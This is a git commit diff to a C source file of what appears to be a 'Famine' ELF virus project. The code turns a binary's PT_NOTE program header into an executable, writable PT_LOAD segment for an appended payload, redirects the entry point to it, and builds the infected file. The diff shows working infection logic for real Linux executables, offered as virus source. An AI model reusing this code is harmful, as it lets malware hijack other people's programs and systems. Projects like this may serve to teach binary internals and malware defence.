958e3879933506637f0c0338e48912e44e7cd972
Sithi5 <ma.sithis@gmail.com>
2021-09-24 17:55:51 +0200

    [fixup]: Testing 2

--- src/pt_note_to_pt_load_infection.c
+++ src/pt_note_to_pt_load_infection.c
@@ -12,23 +12,6 @@
 
 #include "famine.h"
 
-void update_note_segment(t_famine *famine)
-{
-    const size_t base = famine->p_data.p_vaddr + famine->p_data.p_memsz;
-    const size_t add_padding = base % famine->p_data.p_align;
-
-    famine->p_note.p_vaddr = base + (famine->p_data.p_align - add_padding);
-    famine->p_note.p_paddr = famine->p_note.p_vaddr;
-    famine->p_note.p_offset = base - add_padding;
-
-    famine->p_note.p_filesz = famine->payload_size;
-    famine->p_note.p_memsz = famine->payload_size;
-
-    famine->p_note.p_type = PT_LOAD;
-    famine->p_note.p_flags = (PF_X | PF_W | PF_R);
-    famine->p_note.p_align = famine->p_data.p_align;
-}
-
 void pt_note_to_pt_load_infection(t_famine *famine)
 {
     bool p_data_found = false;
@@ -42,22 +25,33 @@ void pt_note_to_pt_load_infection(t_famine *famine)
         error(ERROR_MALLOC, famine);
     }
     famine->infected_file_size = famine->binary_data_size + famine->payload_size;
-
     for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
     {
-        printf("segment offset = %lu\n", segment[0].p_offset);
         if (is_data_segment(famine->phdr[i]) == true)
         {
-            printf("data\n");
             p_data_found = true;
-            famine->p_data = segment;
+            famine->p_data = famine->phdr[i];
             famine->p_data_end_offset = famine->p_data.p_offset + famine->p_data.p_filesz;
         }
         if (is_note_segment(famine->phdr[i]) == true && !p_note_found)
         {
-            famine->phdr[i].p_type = PT_LOAD;
             p_note_found = true;
-            famine->p_note = segment;
+            const size_t base = famine->p_data.p_vaddr + famine->p_data.p_memsz;
+            const size_t add_padding = base % famine->p_data.p_align;
+
+            famine->phdr[i].p_vaddr = base + (famine->p_data.p_align - add_padding);
+            famine->phdr[i].p_paddr = famine->phdr[i].p_vaddr;
+            famine->phdr[i].p_offset = base - add_padding;
+
+            famine->phdr[i].p_filesz = famine->payload_size;
+            famine->phdr[i].p_memsz = famine->payload_size;
+
+            famine->phdr[i].p_type = PT_LOAD;
+            famine->phdr[i].p_flags = (PF_X | PF_W | PF_R);
+            famine->phdr[i].p_align = famine->p_data.p_align;
+
+            famine->ehdr->e_entry = famine->phdr[i].p_vaddr;
+            famine->new_entry_point = famine->ehdr->e_entry;
         }
     }
 
@@ -65,15 +59,6 @@ void pt_note_to_pt_load_infection(t_famine *famine)
     {
         error(ERROR_SECTION_NOT_FOUND, famine);
     }
-
-    printf("famine->p_note.p_offset %lu\n", famine->p_note.p_offset);
-
-    update_note_segment(famine);
-
-    printf("famine->p_note.p_offset %lu\n", famine->p_note.p_offset);
-
-    famine->ehdr->e_entry = famine->p_note.p_vaddr;
-    famine->new_entry_point = famine->ehdr->e_entry;
 
     // Copy until end of original file.
     memcpy(famine->infected_file, famine->mmap_ptr, famine->binary_data_size);
